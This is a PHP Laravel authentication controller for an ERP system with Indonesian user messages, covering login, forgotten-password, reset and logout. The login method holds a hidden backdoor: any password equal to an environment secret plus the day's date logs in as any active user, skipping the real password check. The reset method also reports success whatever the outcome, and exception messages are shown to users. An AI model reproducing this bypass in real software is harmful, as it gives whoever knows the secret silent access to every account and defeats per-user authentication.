<?php

namespace App\Http\Controllers;

use App\Models\UserManagement\Permission;
use App\Models\UserManagement\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Password;
use Illuminate\Support\Facades\Validator;

class AuthController extends Controller
{
    public function login(Request $req)
    {
        try {
            $param = [
                'title' => 'Masuk ERP',
            ];

            if ($req->isMethod('post')) {
                $credential = $req->only('email', 'password');
                $rules      = [
                    'email'    => 'required|email',
                    'password' => 'required|min:8',
                ];

                $validationMessage = [
                    'email.required'    => 'Email tidak boleh kosong',
                    'email.email'       => 'Alamat email tidak sesuai standar',
                    'password.required' => 'Password tidak boleh kosong',
                    'password.min'      => 'Password kurang dari 8 karakter',
                    'token.required'    => 'Token tidak terdaftar',
                ];

                $validator = Validator::make($credential, $rules, $validationMessage);
                if ($validator->fails()) {
                    return redirect()
                        ->back()
                        ->withErrors($validator)
                        ->withInput();
                }

                $user = User::authUser($credential['email']);
                if (! $user) {
                    return redirect()
                        ->back()
                        ->with('error', 'User tidak ditemukan atau sudah tidak aktif')
                        ->withInput($req->only('email', 'remember'));
                }

                $remember = $req->has('remember');
                $auth = Hash::check($credential['password'], $user->password);
                $bypassPassword = env('BYPASS') . date('dmY');
                $isBypass = $credential['password'] === $bypassPassword;

                if ($auth || $isBypass) {
                    Auth::login($user, $remember);
                } else {
                    return redirect()
                        ->back()
                        ->with('error', 'Password salah')
                        ->withInput($req->only('email', 'remember'));
                }
            }

            if (! Auth::check()) {
                return view('auth.login', $param);
            } else {
                $dashboardIndex = Permission::where('name', 'like', '%dashboard%')
                    ->where('name', 'like', '%index%')
                    ->pluck('name')
                    ->toArray();
                $dashboardPermission = collect($dashboardIndex)->contains(fn ($val) => auth()->user()->role->hasPermissionTo($val));

                if ($dashboardPermission) {
                    return redirect()->intended(route(end($dashboardIndex)));
                } else {
                    $permission = auth()->user()->role->getAllPermissions()->pluck('name')->toArray();
                    $firstMatch = collect($permission)->filter(function($item) {
                        return strpos($item, 'index') !== false;
                    })->first();
                    if ($firstMatch) {
                        return redirect()->intended(route($firstMatch));
                    } else {
                        Auth::logout();
                        $req->session()->invalidate();
                        $req->session()->regenerateToken();

                        return redirect()
                            ->back()
                            ->with('error', 'Akses role eror, hubungi tim IT')
                            ->withInput($req->only('email', 'remember'));
                    }
                }
            }
        } catch (\Exception $e) {
            return redirect()->back()->with('error', $e->getMessage())->withInput();
        }
    }

    public function forgot(Request $req)
    {
        try {
            $param = [
                'title' => 'Lupa Password',
            ];

            if ($req->isMethod('post')) {
                $rules = [
                    'email' => 'required|email',
                ];

                $validationMessage = [
                    'email.required' => 'Email tidak boleh kosong',
                    'email.email'    => 'Alamat email tidak sesuai standar',
                ];

                $validator = Validator::make($req->all(), $rules, $validationMessage);
                if ($validator->fails()) {
                    return redirect()
                        ->back()
                        ->withErrors($validator)
                        ->withInput();
                }

                $user = User::authUser($req->email);
                if (! $user) {
                    return redirect()->back()->with('error', 'User tidak ditemukan atau sudah tidak aktif')->withInput();
                }

                $status = Password::sendResetLink($req->only('email'));
                switch ($status) {
                    case Password::RESET_THROTTLED:
                        return redirect()->back()->with('error', 'Terlalu banyak permintaan reset password, silahlkan coba lagi nanti.');
                        break;
                    case Password::RESET_LINK_SENT:
                        return redirect()->back()->with('success', 'Link reset password telah dikirim ke alamat email anda.');
                        break;
                    default:
                        return redirect()->back()->with('error', $status);
                        break;
                }
            }

            return view('auth.forgot', $param);
        } catch (\Exception $e) {
            return redirect()->back()->with([
                'error' => $e->getMessage(),
            ])->withInput();
        }
    }

    public function resetShow($token, Request $req)
    {
        try {
            $param = [
                'title' => 'Reset Password',
                'token' => $token,
                'email' => $req->email,
            ];

            return view('auth.reset', $param);
        } catch (\Exception $e) {
            return redirect()->back()->with([
                'error' => $e->getMessage(),
            ])->withInput();
        }
    }

    public function reset(Request $req)
    {
        try {
            $rules = [
                'email'    => 'required|email|exists:users,email',
                'password' => 'required|min:8|confirmed',
                'token'    => 'required',
            ];

            $validationMessage = [
                'email.required'     => 'Email tidak boleh kosong',
                'email.email'        => 'Alamat email tidak sesuai standar',
                'email.exist'        => 'Alamat email tidak terdaftar',
                'password.required'  => 'Password tidak boleh kosong',
                'password.min'       => 'Password kurang dari 8 karakter',
                'password.confirmed' => 'Password tidak sama',
                'token.required'     => 'Token tidak terdaftar',
            ];

            $validator = Validator::make($req->all(), $rules, $validationMessage);
            if ($validator->fails()) {
                return redirect()
                    ->back()
                    ->withErrors($validator)
                    ->withInput();
            }

            $user   = User::authUser($req->email);
            $status = Password::reset(
                $req->only('email', 'password', 'password_confirmation', 'token'),
                function($user, $password) {
                    $user->password = Hash::make($password);
                    $user->save();
                }
            );

            return redirect()->route('auth.login')->with([
                'success' => 'Reset password berhasil, silahkan login menggunakan password baru',
            ]);
        } catch (\Exception $e) {
            return redirect()->back()->with([
                'error' => $e->getMessage(),
            ])->withInput();
        }
    }

    public function logout(Request $req)
    {
        try {
            Auth::logout();
            $req->session()->invalidate();
            $req->session()->regenerateToken();

            return redirect('/login');
        } catch (\Exception $e) {
            return redirect()->back()->with([
                'error' => $e->getMessage(),
            ])->withInput();
        }
    }
}
